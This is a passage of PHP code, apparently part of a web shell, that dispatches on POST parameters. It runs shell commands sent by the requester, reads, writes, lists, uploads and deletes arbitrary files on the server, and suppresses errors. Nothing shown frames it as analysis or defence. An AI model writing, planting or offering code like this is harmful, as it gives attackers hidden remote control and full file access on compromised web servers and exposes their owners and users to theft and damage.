        $c  = $_POST['cmd'];
        echo json_encode(['dir'=>$p,'out'=>ex('cd '.escapeshellarg($p).' && '.escapeshellarg($c))], JSON_UNESCAPED_UNICODE);
        break;
    case 'read':
        $f = $_POST['file'];
        echo @file_get_contents($f) ?: '';
        break;
    case 'write':
        $f = $_POST['file']; $d = base64_decode($_POST['data']);
        echo @file_put_contents($f,$d) ? '1':'0';
        break;
    case 'ls':
        $d = $_POST['dir'];
        $o=[];
        foreach (@scandir($d) as $x){ $o[]=$x; }
        echo json_encode($o, JSON_UNESCAPED_UNICODE);
        break;
    case 'up':
        $t = $_POST['path'];
        echo @move_uploaded_file($_FILES['f']['tmp_name'], $t) ? '1':'0';
        break;
    case 'del':
        echo @unlink($_POST['file']) ? '1':'0';
        break;
}
